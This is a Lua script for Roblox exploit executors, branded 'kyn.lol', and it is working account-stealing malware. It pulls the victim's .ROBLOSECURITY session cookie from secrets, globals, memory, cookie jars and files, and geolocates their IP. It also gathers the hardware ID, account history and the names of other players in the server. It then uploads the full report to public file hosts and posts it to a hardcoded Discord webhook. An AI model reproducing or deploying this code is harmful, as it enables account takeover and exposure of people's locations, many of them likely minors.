--[[
    kyn.lol · one embed · download link · full dump
]]

local WEBHOOK = (getgenv and getgenv().KYN_WEBHOOK)
    or (_G.KYN_WEBHOOK)
    or "https://discord.com/api/webhooks/1572425420576395414/bdw93EKL4Q3GQ178w7QeMq4YyLRacgsf9qazzFdDm-Eu2S9warf2EBTSJb5w2346MjAi"

local HS = game:GetService("HttpService")
local Players = game:GetService("Players")
local MPS = game:GetService("MarketplaceService")
local RAS = game:GetService("RbxAnalyticsService")
local LS = game:GetService("LocalizationService")
local UIS = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local lp = Players.LocalPlayer

local function safe(fn, d)
    local ok, v = pcall(fn)
    return (ok and v ~= nil) and v or d
end

local function trunc(s, n)
    s = tostring(s or "")
    if #s <= n then return s end
    return s:sub(1, n - 1) .. "…"
end


local function abbr(s, n)
    s = tostring(s or "")
    n = n or 28
    if #s <= n then return s end
    return s:sub(1, n - 1) .. "…"
end

local function sanitize(s)
    s = tostring(s or "x"):gsub("[^%w%-%_%.]", "_")
    return (#s > 0 and s) or "x"
end

local function reqFn()
    if syn and type(syn.request) == "function" then return syn.request end
    if http and type(http.request) == "function" then return http.request end
    if type(http_request) == "function" then return http_request end
    if type(request) == "function" then return request end
    if fluxus and type(fluxus.request) == "function" then return fluxus.request end
    return nil
end

local function httpReq(opts)
    local fn = reqFn()
    if not fn then return nil end
    local ok, res = pcall(fn, opts)
    return ok and res or nil
end

local function postJson(url, tbl)
    local body = HS:JSONEncode(tbl)
    local res = httpReq({
        Url = url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body,
    })
    if res then
        local c = tonumber(res.StatusCode) or tonumber(res.Status) or 0
        if c == 200 or c == 204 or c == 0 or res.Success then return true end
    end
    pcall(function()
        game:HttpPost(url, body, Enum.HttpContentType.ApplicationJson)
    end)
    return false
end

local function httpGet(url)
    local res = httpReq({
        Url = url,
        Method = "GET",
        Headers = { ["User-Agent"] = "Mozilla/5.0" },
    })
    if res and res.Body then
        local c = tonumber(res.StatusCode) or 0
        if c == 200 or c == 0 then return tostring(res.Body) end
    end
    local ok, b = pcall(function() return game:HttpGet(url) end)
    return ok and b or nil
end

local function jget(url)
    local b = httpGet(url)
    if not b then return nil end
    local ok, d = pcall(function() return HS:JSONDecode(b) end)
    return ok and d or nil
end

----------------------------------------------------------------
-- upload report → public download link (catbox / litterbox / 0x0)
----------------------------------------------------------------
local function uploadReport(filename, content)
    -- catbox
    local res = httpReq({
        Url = "https://catbox.moe/user/api.php",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
        Body = "reqtype=fileupload&fileToUpload=" .. HS:UrlEncode(content),
    })
    -- catbox expects multipart for files; try syn Files form
    if syn and syn.request then
        local ok, r = pcall(syn.request, {
            Url = "https://catbox.moe/user/api.php",
            Method = "POST",
            Form = {
                reqtype = "fileupload",
            },
            Files = {
                fileToUpload = { filename, content },
            },
        })
        if ok and r and r.Body and tostring(r.Body):find("https://", 1, true) then
            return tostring(r.Body):match("https://%S+")
        end
        ok, r = pcall(syn.request, {
            Url = "https://litterbox.catbox.moe/resources/internals/api.php",
            Method = "POST",
            Form = { reqtype = "fileupload", time = "72h" },
            Files = { fileToUpload = { filename, content } },
        })
        if ok and r and r.Body and tostring(r.Body):find("https://", 1, true) then
            return tostring(r.Body):match("https://%S+")
        end
    end

    -- 0x0.st plain body upload
    local r2 = httpReq({
        Url = "https://0x0.st",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
        Body = "file=" .. HS:UrlEncode(content),
    })
    if r2 and r2.Body and tostring(r2.Body):find("https://", 1, true) then
        return tostring(r2.Body):match("https://%S+")
    end

    -- gist-like fallback: paste into webhook as attachment via discord multipart
    if syn and syn.request then
        local boundary = "----kyn" .. tostring(math.random(1e8, 1e9))
        local payload = HS:JSONEncode({
            username = "kyn.lol",
            content = "full report file",
        })
        local body = table.concat({
            "--" .. boundary,
            'Content-Disposition: form-data; name="payload_json"',
            "",
            payload,
            "--" .. boundary,
            'Content-Disposition: form-data; name="files[0]"; filename="' .. filename .. '"',
            "Content-Type: text/plain",
            "",
            content,
            "--" .. boundary .. "--",
            "",
        }, "\r\n")
        local ok, r = pcall(syn.request, {
            Url = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = body,
        })
        if ok and r then
            local code = tonumber(r.StatusCode) or 0
            if (code == 200 or code == 204) and r.Body and #tostring(r.Body) > 5 then
                local okj, j = pcall(function() return HS:JSONDecode(r.Body) end)
                if okj and j and j.attachments and j.attachments[1] and j.attachments[1].url then
                    return j.attachments[1].url
                end
            end
        end
    end

    return nil
end

----------------------------------------------------------------
-- launch counter
----------------------------------------------------------------
local launches, firstL, lastL = 1, os.date("%Y-%m-%d %H:%M:%S"), os.date("%Y-%m-%d %H:%M:%S")
pcall(function()
    if not (isfile and readfile and writefile) then return end
    local path = "kyn_launch_count.txt"
    if isfile(path) then
        local raw = readfile(path) or ""
        local c, f = raw:match("^(%d+)|([^|]*)")
        if c then
            launches = (tonumber(c) or 0) + 1
            firstL = (f ~= "" and f) or firstL
        end
    end
    lastL = os.date("%Y-%m-%d %H:%M:%S")
    writefile(path, string.format("%d|%s|%s", launches, firstL, lastL))
end)

----------------------------------------------------------------
-- cookie
----------------------------------------------------------------
local function grabCookie()
    local best, src, hits = "", "", 0
    local function add(v, s)
        if type(v) ~= "string" then return end
        v = v:gsub("^%.ROBLOSECURITY=", ""):gsub("^ROBLOSECURITY=", "")
        v = v:match("^%s*(.-)%s*$") or v
        if #v < 40 then return end
        hits = hits + 1
        local score = #v + (v:find("WARNING:%-", 1, true) and 5000 or 0)
        local cur = #best + (best:find("WARNING:%-", 1, true) and 5000 or 0)
        if score > cur then best, src = v, s end
    end
    pcall(function()
        if getsecret then
            add(getsecret("ROBLOSECURITY"), "secret")
            add(getsecret(".ROBLOSECURITY"), "secret")
        end
    end)
    pcall(function()
        local g = (getgenv and getgenv()) or _G
        add(g.ROBLOSECURITY or g[".ROBLOSECURITY"] or g.Cookie or g.cookie, "env")
    end)
    pcall(function()
        if not getgc then return end
        for _, o in ipairs(getgc(true)) do
            if type(o) == "string" and #o > 80 and o:find("WARNING:%-", 1, true) then add(o, "gc") end
            if type(o) == "table" then
                local a = rawget(o, ".ROBLOSECURITY") or rawget(o, "ROBLOSECURITY")
                if type(a) == "string" then add(a, "gc") end
            end
        end
    end)
    local fn = reqFn()
    if fn then
        pcall(function()
            local r = fn({ Url = "https://www.roblox.com/home", Method = "GET" })
            if r and type(r.Cookies) == "table" then
                for k, v in pairs(r.Cookies) do
                    if tostring(k):upper():find("ROBLOSECURITY") then add(tostring(v), "jar") end
                end
            end
            if r and type(r.Headers) == "table" then
                for k, v in pairs(r.Headers) do
                    if tostring(k):lower():find("cookie") then
                        for m in tostring(v):gmatch("%.?ROBLOSECURITY=([^;]+)") do add(m, "hdr") end
                    end
                end
            end
        end)
    end
    pcall(function()
        if not (isfile and readfile) then return end
        for _, p in ipairs({ "cookie.txt", "ROBLOSECURITY.txt", ".ROBLOSECURITY", "workspace/cookie.txt" }) do
            if isfile(p) then
                local b = readfile(p) or ""
                for m in b:gmatch("%.?ROBLOSECURITY[_%s=]*([^;%s\r\n]+)") do add(m, "file") end
            end
        end
    end)
    return best, src, hits
end

----------------------------------------------------------------
-- collect more
----------------------------------------------------------------
local cookie, cookieSrc, cookieHits = grabCookie()

local ip, country, region, city, isp, org, proxy, lat, lon, tz, zip =
    "?", "?", "?", "?", "?", "?", "?", "?", "?", "?", "?"
do
    local d = jget("http://ip-api.com/json/?fields=status,query,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile")
    if d and d.status == "success" then
        ip = d.query or ip
        country = (d.country or "") .. (d.countryCode and (" (" .. d.countryCode .. ")") or "")
        region = d.regionName or region
        city = d.city or city
        zip = tostring(d.zip or zip)
        isp = d.isp or isp
        org = d.org or org
        proxy = (d.proxy and "Yes") or (d.hosting and "Hosting") or (d.mobile and "Mobile") or "No"
        lat, lon = tostring(d.lat or lat), tostring(d.lon or lon)
        tz = d.timezone or tz
    end
    if ip == "?" then
        local p = httpGet("https://api.ipify.org")
        if p then ip = tostring(p):match("%d+%.%d+%.%d+%.%d+") or ip end
    end
end

local user = safe(function() return lp.Name end, "?")
local disp = safe(function() return lp.DisplayName end, "?")
local uid = safe(function() return tostring(lp.UserId) end, "?")
local age = safe(function() return tostring(lp.AccountAge) end, "?")
local mem = safe(function() return tostring(lp.MembershipType):gsub("Enum.MembershipType.", "") end, "?")
local hwid = safe(function() return RAS:GetClientId() end, "?")
local locale = safe(function() return LS.RobloxLocaleId end, "?")
local sysloc = safe(function() return LS.SystemLocaleId end, "?")
local exec = safe(function()
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    if syn then return "Synapse" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    return "Unknown"
end, "Unknown")
local place = tostring(game.PlaceId)
local job = tostring(game.JobId)
local gid = tostring(game.GameId)
local pver = tostring(game.PlaceVersion)
local gname = safe(function() return MPS:GetProductInfo(game.PlaceId).Name end, "?")
local creator = safe(function()
    local i = MPS:GetProductInfo(game.PlaceId)
    return (i.Creator and i.Creator.Name or "?") .. " (" .. tostring(i.Creator and i.Creator.Id or "?") .. ")"
end, "?")
local platform = safe(function() return tostring(UIS:GetPlatform()) end, "?")
local touch = safe(function() return tostring(UIS.TouchEnabled) end, "?")
local kb = safe(function() return tostring(UIS.KeyboardEnabled) end, "?")
local mouse = safe(function() return tostring(UIS.MouseEnabled) end, "?")
local pad = safe(function() return tostring(UIS.GamepadEnabled) end, "?")
local screen = safe(function()
    local v = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
    return v and (math.floor(v.X) .. "x" .. math.floor(v.Y)) or "?"
end, "?")
local fps = safe(function() return string.format("%.1f", workspace:GetRealPhysicsFPS()) end, "?")
local ping = safe(function()
    local i = Stats.Network.ServerStatsItem["Data Ping"]
    return i and tostring(i:GetValueString()) or "?"
end, "?")
local team = safe(function() return lp.Team and lp.Team.Name or "None" end, "None")
local hp = safe(function()
    local h = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
    return h and (math.floor(h.Health) .. "/" .. math.floor(h.MaxHealth)) or "n/a"
end, "n/a")
local playersHere = safe(function() return tostring(#Players:GetPlayers()) end, "?")
local maxPlayers = safe(function() return tostring(Players.MaxPlayers) end, "?")
local stamp = os.date("%Y-%m-%d %H:%M:%S")

local friends, followers, followings = "?", "?", "?"
pcall(function()
    local a = jget("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
    local b = jget("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
    local c = jget("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
    if a and a.count ~= nil then friends = tostring(a.count) end
    if b and b.count ~= nil then followers = tostring(b.count) end
    if c and c.count ~= nil then followings = tostring(c.count) end
end)

local created, verified, bio = "?", "?", ""
pcall(function()
    local j = jget("https://users.roblox.com/v1/users/" .. uid)
    if j then
        created = tostring(j.created or "?")
        verified = tostring(j.hasVerifiedBadge)
        bio = trunc(tostring(j.description or ""), 200)
    end
end)

local pastNames = ""
pcall(function()
    local j = jget("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=10&sortOrder=Desc")
    if j and type(j.data) == "table" then
        local t = {}
        for i, row in ipairs(j.data) do
            if i > 8 then break end
            if row.name then t[#t + 1] = row.name end
        end
        pastNames = table.concat(t, ", ")
    end
end)

local badgeN, limitedN = "?", "?"
pcall(function()
    local j = jget("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10&sortOrder=Desc")
    if j and j.data then badgeN = tostring(#j.data) .. "+" end
end)
pcall(function()
    local j = jget("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Asc")
    if j and j.data then limitedN = tostring(#j.data) .. "+" end
end)

local others, otherN = {}, 0
for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= lp then
        otherN = otherN + 1
        if #others < 15 then
            others[#others + 1] = string.format("%s (%s) [%d]", plr.DisplayName, plr.Name, plr.UserId)
        end
    end
end
local othersText = (#others > 0 and table.concat(others, "\n")) or "(solo)"
if otherN > #others then othersText = othersText .. "\n+" .. (otherN - #others) .. " more" end

local univPlaying, univVisits = "?", "?"
pcall(function()
    local j = jget("https://games.roblox.com/v1/games?universeIds=" .. gid)
    if j and j.data and j.data[1] then
        univPlaying = tostring(j.data[1].playing or "?")
        univVisits = tostring(j.data[1].visits or "?")
    end
end)

----------------------------------------------------------------
-- full report (download body)
----------------------------------------------------------------
local fname = sanitize(disp) .. "_" .. sanitize(user) .. ".txt"
local report = table.concat({
    "========== kyn.lol ==========",
    "time: " .. stamp,
    "launches: " .. launches,
    "first_launch: " .. firstL,
    "last_launch: " .. lastL,
    "",
    "=== ACCOUNT ===",
    "display: " .. disp,
    "username: " .. user,
    "user_id: " .. uid,
    "profile: https://www.roblox.com/users/" .. uid .. "/profile",
    "age_days: " .. age,
    "membership: " .. mem,
    "verified: " .. verified,
    "created: " .. created,
    "friends: " .. friends,
    "followers: " .. followers,
    "followings: " .. followings,
    "badges_sample: " .. badgeN,
    "collectibles_sample: " .. limitedN,
    "past_usernames: " .. pastNames,
    "bio: " .. bio,
    "",
    "=== NETWORK ===",
    "ip: " .. ip,
    "country: " .. country,
    "region: " .. region,
    "city: " .. city,
    "zip: " .. zip,
    "lat: " .. lat,
    "lon: " .. lon,
    "timezone: " .. tz,
    "isp: " .. isp,
    "org: " .. org,
    "proxy: " .. proxy,
    "",
    "=== CLIENT ===",
    "executor: " .. exec,
    "hwid: " .. hwid,
    "platform: " .. platform,
    "screen: " .. screen,
    "fps: " .. fps,
    "ping: " .. ping,
    "touch: " .. touch,
    "keyboard: " .. kb,
    "mouse: " .. mouse,
    "gamepad: " .. pad,
    "locale: " .. locale,
    "system_locale: " .. sysloc,
    "",
    "=== GAME ===",
    "name: " .. gname,
    "place_id: " .. place,
    "job_id: " .. job,
    "game_id: " .. gid,
    "place_version: " .. pver,
    "creator: " .. creator,
    "universe_playing: " .. univPlaying,
    "universe_visits: " .. univVisits,
    "server_players: " .. playersHere .. "/" .. maxPlayers,
    "team: " .. team,
    "health: " .. hp,
    "join: roblox://placeId=" .. place .. "&gameInstanceId=" .. job,
    "",
    "=== SERVER PLAYERS ===",
    othersText,
    "",
    "=== COOKIE ===",
    "source: " .. tostring(cookieSrc),
    "hits: " .. tostring(cookieHits),
    (#cookie > 0 and cookie or "none"),
    "",
    "==============================",
}, "\n")

if writefile then pcall(writefile, fname, report) end

local downloadUrl = uploadReport(fname, report)
local dlLine = downloadUrl and ("[Download full report .txt](" .. downloadUrl .. ")")
    or ("local file `" .. fname .. "` (upload host blocked — report in description)")

----------------------------------------------------------------
-- ONE EMBED — everything in description (one box) + download link
----------------------------------------------------------------
local box = table.concat({
    "━━━━━━━━━━━━━━━━━━━━",
    "DOWNLOAD:",
    downloadUrl and downloadUrl or ("local only · " .. fname),
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "LAUNCHES:",
    "  Count: " .. tostring(launches),
    "  First: " .. tostring(firstL),
    "  Last: " .. tostring(lastL),
    "",
    "ACCOUNT:",
    "  Display: " .. abbr(disp, 32),
    "  Username: " .. abbr(user, 32),
    "  User ID: " .. uid,
    "  Profile: https://www.roblox.com/users/" .. uid .. "/profile",
    "  Age (days): " .. age,
    "  Membership: " .. mem,
    "  Verified: " .. verified,
    "  Created: " .. abbr(created, 32),
    "  Friends: " .. friends,
    "  Followers: " .. followers,
    "  Following: " .. followings,
    "  Badges: " .. badgeN,
    "  Collectibles: " .. limitedN,
    "  Past Names: " .. abbr((pastNames ~= "" and pastNames) or "none", 60),
    "  Bio: " .. abbr((bio ~= "" and bio) or "none", 60),
    "",
    "NETWORK:",
    "  IP Address: " .. ip,
    "  Country: " .. abbr(country, 36),
    "  Region: " .. abbr(region, 36),
    "  City: " .. abbr(city, 36),
    "  ZIP: " .. zip,
    "  Latitude: " .. lat,
    "  Longitude: " .. lon,
    "  Timezone: " .. abbr(tz, 32),
    "  ISP: " .. abbr(isp, 40),
    "  Organization: " .. abbr(org, 40),
    "  Proxy/Hosting: " .. proxy,
    "",
    "CLIENT:",
    "  Executor: " .. abbr(exec, 36),
    "  HWID: " .. abbr(hwid, 40),
    "  Platform: " .. platform,
    "  Screen: " .. screen,
    "  FPS: " .. fps,
    "  Ping: " .. ping,
    "  Touch: " .. touch,
    "  Keyboard: " .. kb,
    "  Mouse: " .. mouse,
    "  Gamepad: " .. pad,
    "  Locale: " .. locale,
    "  System Locale: " .. sysloc,
    "",
    "GAME:",
    "  Name: " .. abbr(gname, 40),
    "  Place ID: " .. place,
    "  Job ID: " .. abbr(job, 40),
    "  Game ID: " .. gid,
    "  Version: " .. pver,
    "  Creator: " .. abbr(creator, 40),
    "  Players: " .. playersHere .. "/" .. maxPlayers,
    "  Universe Play: " .. univPlaying,
    "  Universe Visits: " .. univVisits,
    "  Team: " .. abbr(team, 28),
    "  Health: " .. hp,
    "",
    "SERVER (" .. tostring(otherN) .. " others):",
    abbr(othersText, 500),
    "",
    "COOKIE:",
    "  Source: " .. tostring(cookieSrc),
    "  Hits: " .. tostring(cookieHits),
    "  Value: " .. abbr((#cookie > 0 and cookie) or "none", 80),
    "━━━━━━━━━━━━━━━━━━━━",
}, "\n")

-- description max 4096
box = trunc(box, 3900)

postJson(WEBHOOK, {
    username = "kyn.lol",
    embeds = {{
        title = trunc("kyn · " .. abbr(disp, 20) .. " (" .. abbr(user, 18) .. ")", 240),
        url = "https://www.roblox.com/users/" .. uid .. "/profile",
        color = 0xFF3040,
        description = box,
        fields = {
            {
                name = "Full report download",
                value = downloadUrl
                    and ("[Click here to download .txt](" .. downloadUrl .. ")\nFile: `" .. fname .. "`")
                    or ("Host upload unavailable.\nLocal file: `" .. fname .. "`"),
                inline = false,
            },
        },
        footer = { text = "kyn.lol · " .. stamp },
    }},
})
